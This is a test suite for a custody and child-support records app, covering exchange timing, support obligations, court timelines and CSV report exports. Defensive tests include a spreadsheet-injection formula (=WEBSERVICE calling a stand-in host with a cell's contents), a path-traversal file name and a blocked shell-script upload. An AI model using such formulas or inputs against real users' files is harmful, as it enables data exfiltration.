import { describe, expect, it } from "vitest";
import {
  assertOwnedRecord,
  buildCalendarEvents,
  buildCustodyDayMap,
  buildDashboardTimelineStats,
  buildEvidenceIndex,
  buildNeutralExchangeSummary,
  calculateChildSupportStats,
  calculateChildSupportObligationStats,
  calculateExchangeStats,
  calculateExchangeTiming,
  calculateExpenseStats,
  containsForbiddenGeneratedTerm,
  filterOwnedCaseRecords,
  generateChildSupportObligations,
  generateExpectedExchangeEvents,
  isLateExchangeTimelineEvent,
  isNoFaceTimeTimelineEvent,
  isPostCallFaceTimeNotice,
  isTimelineVisibleEvent,
  timeOfDayPositionPercent,
} from "@/lib/records/calculations";
import { createRecordsSeed, demoCaseId, demoUserId } from "@/lib/records/seed";
import {
  buildReportPreview,
  buildSectionExportPacket,
  reportTypeLabels,
  reportPreviewToCsv,
  reportsTabReportTypes,
  rowsToCsv,
  sectionExportToCsv,
} from "@/lib/records/reports";
import type { CalendarEvent, ReportType } from "@/lib/records/types";
import {
  childSupportOrderSchema,
  evidenceFileName,
  validateEvidenceDisplayFileName,
  validateEvidenceFile,
} from "@/lib/records/validation";

const range = { from: "2026-05-01", to: "2026-05-31" };

describe("records calculations", () => {
  it("positions calendar exchange times across a 24 hour day", () => {
    expect(timeOfDayPositionPercent("00:00")).toBe(0);
    expect(timeOfDayPositionPercent("12:00")).toBe(50);
    expect(timeOfDayPositionPercent("17:00")).toBeCloseTo(70.8333, 4);
    expect(timeOfDayPositionPercent("23:59")).toBeCloseTo(99.9306, 4);
    expect(timeOfDayPositionPercent("5:00 PM")).toBeNull();
    expect(timeOfDayPositionPercent("24:00")).toBeNull();
  });

  it("calculates late, early, and missed exchange timing", () => {
    const dataset = createRecordsSeed();
    const late = dataset.exchangeLogs.find((log) => log.id === "exchange-2026-05-08");
    const early = dataset.exchangeLogs.find((log) => log.id === "exchange-2026-05-22");
    const missed = dataset.exchangeLogs.find((log) => log.id === "exchange-2026-05-15");

    expect(late && calculateExchangeTiming(late)).toMatchObject({
      minutesEarlyOrLate: 32,
      isLate: true,
      isMissed: false,
    });
    expect(early && calculateExchangeTiming(early)).toMatchObject({
      minutesEarlyOrLate: -8,
      isEarly: true,
    });
    expect(missed && calculateExchangeTiming(missed)).toMatchObject({
      minutesEarlyOrLate: null,
      isMissed: true,
    });
  });

  it("generates recurring expected exchanges and range statistics", () => {
    const dataset = createRecordsSeed();
    const rules = filterOwnedCaseRecords(dataset.exchangeRules, demoUserId, demoCaseId);
    const expected = generateExpectedExchangeEvents(rules, range);
    const logs = filterOwnedCaseRecords(dataset.exchangeLogs, demoUserId, demoCaseId);
    const stats = calculateExchangeStats(logs, expected, range);

    expect(expected.length).toBeGreaterThanOrEqual(8);
    expect(stats.lateCount).toBe(1);
    expect(stats.missedCount).toBe(1);
    expect(stats.averageLatenessMinutes).toBe(32);
    expect(stats.longestLatenessMinutes).toBe(32);
  });

  it("calculates child support due, paid, partial, unpaid, and late metrics", () => {
    const dataset = createRecordsSeed();
    const payments = filterOwnedCaseRecords(dataset.childSupportPayments, demoUserId, demoCaseId);
    const stats = calculateChildSupportStats(payments, { from: "2026-03-01", to: "2026-06-30" });

    expect(stats.totalDue).toBe(1800);
    expect(stats.totalPaid).toBe(1100);
    expect(stats.unpaidBalance).toBe(700);
    expect(stats.partialCount).toBe(1);
    expect(stats.unpaidCount).toBe(1);
    expect(stats.lateCount).toBeGreaterThanOrEqual(1);
  });

  it("derives a missed July obligation when the first recorded payment applies to August", () => {
    const dataset = createRecordsSeed();
    const seededOrder = dataset.childSupportOrders[0];
    const seededPayment = dataset.childSupportPayments[0];
    if (!seededOrder || !seededPayment) throw new Error("Child support seed records are missing.");

    const order = {
      ...seededOrder,
      id: "support-order-july-start",
      orderedAmount: 500,
      effectiveStartDate: "2026-07-01",
      firstPaymentDueDate: "2026-07-01",
    };
    const augustPayment = {
      ...seededPayment,
      id: "support-payment-august",
      childSupportOrderId: order.id,
      dueDate: "2026-08-01",
      amountDue: 500,
      amountPaid: 500,
      paymentDate: "2026-08-01",
      paymentStatus: "paid" as const,
    };

    const obligations = generateChildSupportObligations(
      [order],
      [augustPayment],
      { from: "2026-07-01", to: "2026-08-31" },
      "2026-08-31"
    );
    const stats = calculateChildSupportObligationStats(obligations, "2026-08-31");

    expect(obligations).toMatchObject([
      {
        dueDate: "2026-07-01",
        amountDue: 500,
        amountPaid: 0,
        balance: 500,
        status: "unpaid",
        source: "order_schedule",
      },
      {
        dueDate: "2026-08-01",
        amountDue: 500,
        amountPaid: 500,
        balance: 0,
        status: "paid",
        source: "order_schedule",
      },
    ]);
    expect(stats).toMatchObject({
      totalDue: 1000,
      totalPaid: 500,
      unpaidBalance: 500,
      pastDueBalance: 500,
      pastDueCount: 1,
    });
  });

  it("keeps monthly and semi monthly obligation dates anchored to the entered due dates", () => {
    const dataset = createRecordsSeed();
    const seededOrder = dataset.childSupportOrders[0];
    if (!seededOrder) throw new Error("Child support seed order is missing.");

    const monthly = {
      ...seededOrder,
      id: "month-end-order",
      effectiveStartDate: "2026-01-31",
      firstPaymentDueDate: "2026-01-31",
    };
    const semiMonthly = {
      ...seededOrder,
      id: "semi-monthly-order",
      paymentFrequency: "semi_monthly" as const,
      effectiveStartDate: "2026-01-01",
      firstPaymentDueDate: "2026-01-01",
      secondPaymentDueDate: "2026-01-15",
    };

    const monthlyDates = generateChildSupportObligations(
      [monthly],
      [],
      { from: "2026-01-01", to: "2026-03-31" },
      "2026-03-31"
    ).map((obligation) => obligation.dueDate);
    const semiMonthlyDates = generateChildSupportObligations(
      [semiMonthly],
      [],
      { from: "2026-01-01", to: "2026-02-28" },
      "2026-02-28"
    ).map((obligation) => obligation.dueDate);

    expect(monthlyDates).toEqual(["2026-01-31", "2026-02-28", "2026-03-31"]);
    expect(semiMonthlyDates).toEqual([
      "2026-01-01",
      "2026-01-15",
      "2026-02-01",
      "2026-02-15",
    ]);
  });

  it("requires structured due dates and rejects child support dates outside the order term", () => {
    const baseOrder = {
      orderNickname: "Test support order",
      orderedAmount: "500",
      currency: "USD",
      paymentFrequency: "monthly",
      dueDayOrSchedule: "First of each month",
      effectiveStartDate: "2026-07-01",
      effectiveEndDate: "2026-12-31",
      firstPaymentDueDate: "",
      secondPaymentDueDate: "",
      payerLabel: "Parent B",
      recipientLabel: "Parent A",
      paymentMethodExpected: "",
      agencyOrCaseNumber: "",
      notes: "",
    };

    expect(childSupportOrderSchema.safeParse(baseOrder).success).toBe(false);
    expect(
      childSupportOrderSchema.safeParse({
        ...baseOrder,
        firstPaymentDueDate: "2027-01-01",
      }).success
    ).toBe(false);
    expect(
      childSupportOrderSchema.safeParse({
        ...baseOrder,
        firstPaymentDueDate: "2026-07-01",
      }).success
    ).toBe(true);
  });

  it("calculates expense reimbursement totals by date range", () => {
    const dataset = createRecordsSeed();
    const expenses = filterOwnedCaseRecords(dataset.expenseItems, demoUserId, demoCaseId);
    const stats = calculateExpenseStats(expenses, range);

    expect(stats.totalExpenses).toBeCloseTo(119.22);
    expect(stats.reimbursementRequested).toBeCloseTo(119.22);
    expect(stats.reimbursementReceived).toBeCloseTo(17.5);
    expect(stats.unpaidReimbursement).toBeCloseTo(101.72);
    expect(stats.byCategory.map((row) => row.category)).toContain("school");
  });

  it("keeps custody day colors off the timeline while surfacing dated transition exchanges", () => {
    const dataset = createRecordsSeed();
    const assignments = filterOwnedCaseRecords(dataset.custodyDayAssignments, demoUserId, demoCaseId);
    const dayMap = buildCustodyDayMap(assignments, range);
    const events = buildCalendarEvents(dataset, demoUserId, demoCaseId, range);
    const custodyExchange = events.find(
      (event) => event.id === "custody-scheduled-exchange-custody-day-2026-05-01"
    );

    expect(dayMap.get("2026-05-01")).toMatchObject({
      caregiverLabel: "Parent A",
      color: "#0f766e",
      exchangeTime: "18:00",
    });
    expect(custodyExchange).toMatchObject({
      date: "2026-05-01",
      time: "18:00",
      type: "scheduled_exchange",
      sourceLabel: "Custody calendar",
    });
    expect(events.some((event) => event.type === "custody_day")).toBe(false);
    expect(
      isTimelineVisibleEvent({
        id: "legacy-custody-day",
        caseId: demoCaseId,
        date: "2026-05-01",
        type: "custody_day",
        title: "Parent A",
      })
    ).toBe(false);
  });

  it("builds a detailed court timeline from exchanges, notes, evidence, support, and expenses", () => {
    const dataset = createRecordsSeed();
    const events = buildCalendarEvents(dataset, demoUserId, demoCaseId, range);
    const lateExchange = events.find((event) => event.id === "log-exchange-2026-05-08");
    const schoolNote = events.find((event) => event.id === "note-note-school-2026-05-05");
    const evidence = events.find((event) => event.id === "evidence-evidence-exchange-2026-05-08");
    const supportDue = events.find(
      (event) => event.id === "support-obligation-support-order-current-2026-05-01"
    );
    const expense = events.find((event) => event.id === "expense-expense-school-2026-05-03");

    expect(lateExchange).toMatchObject({
      date: "2026-05-08",
      time: "18:32",
      type: "logged_exchange",
      severity: "attention",
      sourceLabel: "Exchange log",
    });
    expect(lateExchange?.detail).toContain("32 minutes after ordered time");
    expect(lateExchange?.body).toContain("Recorded arrival at 6:32 PM.");
    expect(schoolNote).toMatchObject({
      time: "16:30",
      body: "Documented pickup time and after school item transfer.",
      sourceLabel: "Date note",
    });
    expect(evidence).toMatchObject({ type: "evidence_item", sourceLabel: "File attachment" });
    expect(supportDue).toMatchObject({ type: "child_support_due", severity: "attention" });
    expect(expense).toMatchObject({ type: "expense_item", severity: "attention" });
  });

  it("uses an account owner's editable timeline designation over the automatic suggestion", () => {
    const dataset = createRecordsSeed();
    dataset.timelineDesignations.push({
      id: "designation-school-note",
      userId: demoUserId,
      caseId: demoCaseId,
      eventId: "note-note-school-2026-05-05",
      severity: "critical",
      createdAt: "2026-06-15T12:00:00.000Z",
      updatedAt: "2026-06-15T12:00:00.000Z",
    });

    const events = buildCalendarEvents(dataset, demoUserId, demoCaseId, range);
    const schoolNote = events.find((event) => event.id === "note-note-school-2026-05-05");
    const automaticLateExchange = events.find(
      (event) => event.id === "log-exchange-2026-05-08"
    );

    expect(schoolNote).toMatchObject({
      severity: "critical",
      severitySource: "user",
    });
    expect(automaticLateExchange).toMatchObject({
      severity: "attention",
      severitySource: "automatic",
    });
  });
});

describe("privacy and safety helpers", () => {
  it("filters records by authenticated user and selected case", () => {
    const dataset = createRecordsSeed();
    const owned = filterOwnedCaseRecords(dataset.exchangeLogs, demoUserId, demoCaseId);

    expect(owned.every((record) => record.userId === demoUserId)).toBe(true);
    expect(owned.every((record) => record.caseId === demoCaseId)).toBe(true);
    expect(owned.find((record) => record.id === "exchange-other-user")).toBeUndefined();
  });

  it("throws when a user attempts to access another user's record", () => {
    const dataset = createRecordsSeed();
    const otherUserRecord = dataset.exchangeLogs.find((record) => record.id === "exchange-other-user");

    expect(() => assertOwnedRecord(otherUserRecord!, demoUserId, demoCaseId)).toThrow(
      "Record is not owned"
    );
  });

  it("validates private evidence file allow-list and blocks executables", () => {
    expect(
      validateEvidenceFile({
        originalFileName: "exchange-note.pdf",
        fileType: "application/pdf",
        fileSize: 20_000,
      })
    ).toEqual({ ok: true });

    expect(
      validateEvidenceFile({
        originalFileName: "attorney-notes.docx",
        fileType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        fileSize: 20_000,
      })
    ).toEqual({ ok: true });

    expect(
      validateEvidenceFile({
        originalFileName: "script.sh",
        fileType: "text/plain",
        fileSize: 100,
      })
    ).toMatchObject({ ok: false });
  });

  it("validates editable evidence names while preserving the original file type", () => {
    expect(
      validateEvidenceDisplayFileName({
        displayFileName: "July school exchange.pdf",
        originalFileName: "IMG_4821.pdf",
      })
    ).toEqual({ ok: true, fileName: "July school exchange.pdf" });
    expect(
      validateEvidenceDisplayFileName({
        displayFileName: "July school exchange.png",
        originalFileName: "IMG_4821.pdf",
      })
    ).toEqual({ ok: false, error: "Keep the original .pdf file extension." });
    expect(
      validateEvidenceDisplayFileName({
        displayFileName: "../July school exchange.pdf",
        originalFileName: "IMG_4821.pdf",
      })
    ).toMatchObject({ ok: false });
    expect(
      evidenceFileName({
        originalFileName: "IMG_4821.pdf",
        displayFileName: "July school exchange.pdf",
      })
    ).toBe("July school exchange.pdf");
    expect(evidenceFileName({ originalFileName: "IMG_4821.pdf" })).toBe("IMG_4821.pdf");
  });

  it("keeps generated report language neutral", () => {
    const dataset = createRecordsSeed();
    const preview = buildReportPreview(dataset, demoUserId, demoCaseId, range, "combined_attorney_summary");
    const summaryText = preview.summaries.join(" ");
    const exchangeSummary = buildNeutralExchangeSummary(range, 8, 5, 32, 1);

    expect(containsForbiddenGeneratedTerm(summaryText)).toBe(false);
    expect(containsForbiddenGeneratedTerm(exchangeSummary)).toBe(false);
    expect(summaryText).toContain("issue timeline rows only");
    expect(summaryText).toContain("child support, and expense records");
  });

  it("keeps owner records visible while omitting records excluded from reports", () => {
    const dataset = createRecordsSeed();
    const excludedNote = {
      ...dataset.dateNotes[0],
      id: "excluded-note",
      noteDate: "2026-05-14",
      title: "OWNER VISIBLE EXCLUDED NOTE",
      body: "EXCLUDED NOTE BODY SENTINEL",
      includeInReports: false,
    };
    const includedNote = {
      ...excludedNote,
      id: "included-note",
      title: "INCLUDED NOTE",
      body: "INCLUDED NOTE BODY SENTINEL",
      includeInReports: true,
    };
    const excludedEvidence = {
      ...dataset.evidenceItems[0],
      id: "excluded-evidence",
      evidenceDate: "2026-05-14",
      originalFileName: "excluded-private-file.png",
      description: "EXCLUDED FILE METADATA SENTINEL",
      includeInReports: false,
    };
    dataset.dateNotes.push(excludedNote, includedNote);
    dataset.evidenceItems.push(excludedEvidence);

    const ownerEvents = buildCalendarEvents(dataset, demoUserId, demoCaseId, range);
    expect(ownerEvents.map((event) => event.title)).toContain("OWNER VISIBLE EXCLUDED NOTE");

    const exportedText = [
      reportPreviewToCsv(
        buildReportPreview(dataset, demoUserId, demoCaseId, range, "combined_attorney_summary")
      ),
      sectionExportToCsv(buildSectionExportPacket(dataset, demoUserId, demoCaseId, range, "calendar")),
      sectionExportToCsv(buildSectionExportPacket(dataset, demoUserId, demoCaseId, range, "timeline")),
      sectionExportToCsv(buildSectionExportPacket(dataset, demoUserId, demoCaseId, range, "notes")),
      sectionExportToCsv(buildSectionExportPacket(dataset, demoUserId, demoCaseId, range, "evidence")),
    ].join("\n");

    expect(exportedText).toContain("INCLUDED NOTE BODY SENTINEL");
    expect(exportedText).not.toContain("EXCLUDED NOTE BODY SENTINEL");
    expect(exportedText).not.toContain("excluded-private-file.png");
    expect(exportedText).not.toContain("EXCLUDED FILE METADATA SENTINEL");
  });

  it("exports the combined court packet as clean, labeled sections", () => {
    const dataset = createRecordsSeed();
    const preview = buildReportPreview(dataset, demoUserId, demoCaseId, range, "combined_court_packet");
    const csv = reportPreviewToCsv(preview);

    expect(preview.rows).toContainEqual(
      expect.objectContaining({
        section: "custody_schedule",
        caregiver_label: "Parent A",
      })
    );
    expect(preview.tables.map((table) => table.title)).toEqual([
      "Custody schedule context",
      "Logged exchange timing",
      "Combined issue rows",
    ]);
    expect(csv.split("\n")[0]).toBe("Custody schedule context");
    expect(csv).toContain("Date,Caregiver,Exchange time,Direction,Location,Notes");
    expect(csv).toContain("Date,Scheduled time,Actual time,Scheduled source");
    expect(csv).toContain("Date,Time,Issue,Source,Title,Detail,Summary,Notes,Tags");
    expect(csv).not.toContain("caregiver_label");
    expect(csv).not.toContain("scheduled_exchange_time");
  });

  it("neutralizes spreadsheet formulas in CSV exports", () => {
    const csv = rowsToCsv([
      {
        title: "=WEBSERVICE(\"https://example.test/?x=\"&A1)",
        note: "+cmd",
        offset: "-2+3",
        handle: "@user",
        tabbed: "\t=SUM(A1:A2)",
      },
    ]);

    expect(csv).toContain("'=WEBSERVICE");
    expect(csv).toContain("'+cmd");
    expect(csv).toContain("'-2+3");
    expect(csv).toContain("'@user");
    expect(csv).toContain("'\t=SUM");
  });

  it("builds section export packets with chart and table data", () => {
    const dataset = createRecordsSeed();
    const packet = buildSectionExportPacket(dataset, demoUserId, demoCaseId, range, "exchanges");
    const csv = sectionExportToCsv(packet);

    expect(packet.title).toBe("Exchange Compliance Packet");
    expect(packet.metrics.map((metric) => metric.label)).toContain("Late");
    expect(packet.charts.map((chart) => chart.title)).toContain("Minutes early/late by logged exchange");
    expect(packet.tables.map((table) => table.title)).toContain("Logged exchange outcomes");
    expect(csv).toContain("Arriving / drop-off party");
    expect(csv).toContain("Late party");
    expect(csv).toContain("Parent B");
    expect(csv).not.toContain("chart_data");
  });

  it("builds CSV-ready output for every selectable report type", () => {
    const dataset = createRecordsSeed();

    for (const reportType of reportsTabReportTypes.map((item) => item.value)) {
      const preview = buildReportPreview(dataset, demoUserId, demoCaseId, range, reportType);
      const csv = reportPreviewToCsv(preview);

      expect(preview.title).toBe(reportTypeLabels[reportType]);
      expect(preview.metrics.length).toBeGreaterThan(0);
      expect(preview.tables.length + preview.rows.length).toBeGreaterThan(0);
      expect(csv).not.toContain("chart_data");
    }
  });

  it("builds CSV-ready output for report types retained outside the visible report picker", () => {
    const dataset = createRecordsSeed();
    const visibleTypes = new Set(reportsTabReportTypes.map((item) => item.value));
    const retainedTypes = (Object.keys(reportTypeLabels) as ReportType[]).filter(
      (reportType) => !visibleTypes.has(reportType)
    );

    for (const reportType of retainedTypes) {
      const preview = buildReportPreview(dataset, demoUserId, demoCaseId, range, reportType);

      expect(preview.title).toBe(reportTypeLabels[reportType]);
      expect(preview.metrics.length).toBeGreaterThan(0);
      expect(reportPreviewToCsv(preview)).not.toContain("chart_data");
    }
  });

  it("matches every single-table report CSV to its report-specific schema and row count", () => {
    const dataset = createRecordsSeed();
    const reportSchemas: Array<[ReportType, string[]]> = [
      [
        "exchange_compliance",
        [
          "Date",
          "Scheduled time",
          "Actual time",
          "Scheduled source",
          "Direction",
          "Arriving / drop-off party",
          "Late party",
          "Minutes late/early",
          "Status",
          "Location",
          "Reason",
          "Notes",
          "Tags",
        ],
      ],
      ["facetime_cancellations", ["Date", "Time", "Issue", "Title", "Detail", "Summary", "Notes", "Tags"]],
      ["incident_timeline", ["Date", "Time", "Issue", "Source", "Title", "Detail", "Summary", "Notes", "Tags"]],
      [
        "filing_facetime_correlation",
        ["Date", "Time", "Filing note", "Same day", "Within 7 days", "Within 14 days", "Note text"],
      ],
      [
        "child_support_payment",
        [
          "Order",
          "Due date",
          "Scheduled due",
          "Recorded paid",
          "Calculated balance",
          "Payment date",
          "Status",
          "Source",
        ],
      ],
      [
        "expense_reimbursement",
        [
          "Date",
          "Category",
          "Description",
          "Amount",
          "Paid by",
          "Reimbursement requested",
          "Status",
          "Amount reimbursed",
          "Notes",
        ],
      ],
      ["combined_attorney_summary", ["Date", "Time", "Issue", "Source", "Title", "Detail", "Summary", "Notes", "Tags"]],
    ];

    for (const [reportType, expectedHeaders] of reportSchemas) {
      const preview = buildReportPreview(dataset, demoUserId, demoCaseId, range, reportType);
      const csv = reportPreviewToCsv(preview);

      expect(preview.tables).toHaveLength(1);
      expect(preview.tables[0].headers).toEqual(expectedHeaders);
      expect(preview.tables[0].rows).toHaveLength(preview.rows.length);
      expect(csv.split("\n")[0]).toBe(expectedHeaders.join(","));
      expect(csv).not.toContain("section,custody_schedule");
    }
  });

  it("builds CSV-ready packets for every section export", () => {
    const dataset = createRecordsSeed();
    const sectionIds = ["calendar", "timeline", "exchanges", "notes", "evidence", "child_support", "expenses"] as const;

    for (const sectionId of sectionIds) {
      const packet = buildSectionExportPacket(dataset, demoUserId, demoCaseId, range, sectionId);
      const csv = sectionExportToCsv(packet);

      expect(packet.metrics.length).toBeGreaterThan(0);
      expect(packet.tables.length).toBeGreaterThan(0);
      expect(packet.suggestedUses.length).toBeGreaterThan(0);
      expect(csv).not.toContain("chart_data");
    }
  });

  it("describes attention-level timeline records as recorded issues", () => {
    const dataset = createRecordsSeed();
    const packet = buildSectionExportPacket(dataset, demoUserId, demoCaseId, range, "timeline");

    expect(packet.metrics.map((metric) => metric.label)).toContain("Recorded issues");
    expect(packet.metrics.map((metric) => metric.label)).toContain("Issue share");
    expect(packet.metrics.map((metric) => metric.label)).not.toContain("Needs review");
    expect(packet.charts.map((chart) => chart.title)).toContain("Timeline records by status");
    expect(packet.summaries.join(" ")).not.toContain("marked for review");
  });

  it("uses simple caregiver day counters instead of calendar graphs", () => {
    const dataset = createRecordsSeed();
    const packet = buildSectionExportPacket(dataset, demoUserId, demoCaseId, range, "calendar");
    const metrics = new Map(packet.metrics.map((metric) => [metric.label, metric.value]));
    const custodySchedule = packet.tables.find(
      (table) => table.title === "Custody day assignments"
    );

    expect(metrics.get("Parent A days")).toBeGreaterThan(0);
    expect(metrics.get("Parent B days")).toBeGreaterThan(0);
    expect(packet.charts).toEqual([]);
    expect(custodySchedule?.headers).toEqual([
      "Date",
      "Caregiver",
      "Exchange time",
      "Direction",
      "Location",
      "Notes",
    ]);
    expect(custodySchedule?.headers).not.toContain("Start");
    expect(custodySchedule?.headers).not.toContain("End");
    expect(custodySchedule?.rows[0]?.[0]).toBe("2026-05-01");
    expect(custodySchedule?.rows.flat()).toContain("Parent B to Parent A");
  });

  it("exports incident timeline rows from timeline-visible dated record sources", () => {
    const dataset = createRecordsSeed();
    const preview = buildReportPreview(dataset, demoUserId, demoCaseId, range, "incident_timeline");
    const csv = rowsToCsv(preview.rows);

    expect(preview.rows).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          issue: "Late exchange",
          source: "Exchange log",
          title: "Logged exchange: completed late",
        }),
      ])
    );
    expect(preview.rows.some((row) => "source" in row && row.source === "File attachment")).toBe(false);
    expect(preview.rows.some((row) => "source" in row && row.source === "Child support")).toBe(false);
    expect(preview.rows.some((row) => "source" in row && row.source === "Expense")).toBe(false);
    expect(csv.split("\n")[0]).toContain("issue");
    expect(csv).toContain("Recorded arrival at 6:32 PM.");
  });

  it("builds focused report previews with issue-specific charts", () => {
    const dataset = createRecordsSeed();
    const createdAt = "2026-05-10T12:00:00.000Z";
    dataset.dateNotes.push(
      {
        id: "filing-note-test",
        caseId: demoCaseId,
        userId: demoUserId,
        noteDate: "2026-05-10",
        category: "court",
        title: "Motion filed",
        body: "Motion filed with the court.",
        tags: ["motion", "filed"],
        includeInReports: true,
        createdAt,
        updatedAt: createdAt,
      },
      {
        id: "facetime-note-test",
        caseId: demoCaseId,
        userId: demoUserId,
        noteDate: "2026-05-12",
        noteTime: "19:21",
        category: "communication",
        title: "No FaceTime conducted",
        body: "Called first and no answer. Parent B later stated by text that there would be no FaceTime.",
        tags: ["facetime", "no_facetime", "post_call_notice"],
        includeInReports: true,
        createdAt,
        updatedAt: createdAt,
      }
    );

    const exchangePreview = buildReportPreview(dataset, demoUserId, demoCaseId, range, "exchange_compliance");
    const facetimePreview = buildReportPreview(dataset, demoUserId, demoCaseId, range, "facetime_cancellations");
    const correlationPreview = buildReportPreview(
      dataset,
      demoUserId,
      demoCaseId,
      range,
      "filing_facetime_correlation"
    );
    const csv = reportPreviewToCsv(facetimePreview);

    expect(exchangePreview.charts.map((chart) => chart.title)).toContain("Late exchanges by recorded party");
    expect(facetimePreview.metrics.map((metric) => metric.label)).toContain("After call/request");
    expect(facetimePreview.charts.map((chart) => chart.title)).toContain("No FaceTime records by month");
    expect(correlationPreview.charts.map((chart) => chart.title)).toContain(
      "No FaceTime records after filing notes"
    );
    expect(correlationPreview.summaries.join(" ")).toContain("timing overlap only");
    expect(csv.split("\n")[0]).toContain("Date");
    expect(csv).toContain("No FaceTime conducted");
    expect(csv).not.toContain("chart_data");
  });

  it("exports exchange responsibility and scheduled-time source as a clean table", () => {
    const dataset = createRecordsSeed();
    const preview = buildReportPreview(dataset, demoUserId, demoCaseId, range, "exchange_compliance");
    const csv = reportPreviewToCsv(preview);
    const headers = csv.split("\n")[0];

    expect(headers).toContain("Scheduled source");
    expect(headers).toContain("Arriving / drop-off party");
    expect(headers).toContain("Late party");
    expect(csv).toContain("Court order");
    expect(csv).toContain("Parent B");
    expect(csv).not.toContain("metric");
    expect(csv).not.toContain("chart_data");
  });

  it("derives dashboard counts from timeline records including imported text notes", () => {
    const events: CalendarEvent[] = [
      {
        id: "late-note",
        caseId: demoCaseId,
        date: "2026-03-20",
        type: "custody_note",
        title: "Late exchange documented",
        body: "Parent B dropped the children off at 5:40; court order is 5.",
        tags: ["late_exchange", "text_archive"],
        severity: "attention",
      },
      {
        id: "missed-note",
        caseId: demoCaseId,
        date: "2026-03-20",
        type: "custody_note",
        title: "Exchange issue",
        body: "Parent B refused to bring the children at 5.",
        tags: ["refused_exchange"],
        severity: "critical",
      },
      {
        id: "facetime-note",
        caseId: demoCaseId,
        date: "2026-06-12",
        time: "19:21",
        type: "custody_note",
        title: "No FaceTime conducted - no reason stated",
        body: "FaceTimed about 30 minutes earlier. Parent B replied by text: No FT.",
        tags: ["facetime", "no_facetime", "post_call_notice"],
        severity: "attention",
      },
      {
        id: "evidence",
        caseId: demoCaseId,
        date: "2026-06-12",
        type: "evidence_item",
        title: "File attachment: text-export.csv",
        tags: ["text_archive"],
        severity: "neutral",
      },
      {
        id: "delayed-facetime",
        caseId: demoCaseId,
        date: "2026-02-20",
        type: "custody_note",
        title: "FaceTime delayed - napping",
        body: "Parent B replied that Child 1 was napping and would FaceTime when awake.",
        tags: ["facetime", "delayed", "napping"],
        severity: "neutral",
      },
    ];

    const stats = buildDashboardTimelineStats(events);

    expect(isLateExchangeTimelineEvent(events[0])).toBe(true);
    expect(isNoFaceTimeTimelineEvent(events[2])).toBe(true);
    expect(isPostCallFaceTimeNotice(events[2])).toBe(true);
    expect(isNoFaceTimeTimelineEvent(events[4])).toBe(false);
    expect(stats).toMatchObject({
      timelineCount: 5,
      attentionCount: 3,
      lateExchangeCount: 1,
      missedExchangeCount: 1,
      noFaceTimeCount: 1,
      postCallNoFaceTimeCount: 1,
      evidenceCount: 1,
    });
  });

  it("includes evidence scan and storage status without raw storage paths", () => {
    const dataset = createRecordsSeed();
    const item = {
      ...dataset.evidenceItems[0],
      includeInReports: true,
      evidenceDate: "2026-05-12",
      malwareScanStatus: "clean" as const,
      storagePath: "user_demo/case_demo/evidence_1/evidence_1.pdf",
      storageBucket: "records-evidence",
    };
    const index = buildEvidenceIndex([item], range);

    expect(index[0]).toMatchObject({
      scanStatus: "clean",
      storageStatus: "private stored file",
    });
    expect(JSON.stringify(index[0])).not.toContain("storagePath");
    expect(JSON.stringify(index[0])).not.toContain("records-evidence");
  });
});
